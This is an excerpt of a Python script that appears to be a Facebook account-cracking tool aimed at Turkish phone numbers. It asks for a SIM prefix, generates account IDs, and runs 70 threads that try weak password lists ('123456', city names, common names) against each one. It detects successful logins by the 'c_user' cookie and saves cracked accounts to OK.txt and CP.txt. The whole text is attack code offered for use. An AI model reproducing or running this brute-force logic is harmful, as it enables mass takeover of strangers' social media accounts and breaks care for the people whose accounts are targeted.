...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93731498974text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-openhttps://www.facebook.com/profile.php?id=661450917');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def bangla():
	os.system('clear')
	print(logo)
	print('\33[1;35m[1] TURK \x1b[1;92mM 1')
	print('\33[1;35m[2] TURK \x1b[1;92mM 1')
	print('\33[1;35m[3] Go to main menu')
	lines()
	riaz1 = input('\33[1;35m[+] SELECT OPTION : ')
	if riaz1 =='1':
		b1()
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 90554,90531,90543,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'123456','12345678','ali123','ahmet123','mehmet123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 90551,90538,90546,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'turkiye','istanbul','konya42','izmir123','ankra123','','kurtdistan']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\33[1;35mLOY-OMAR\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
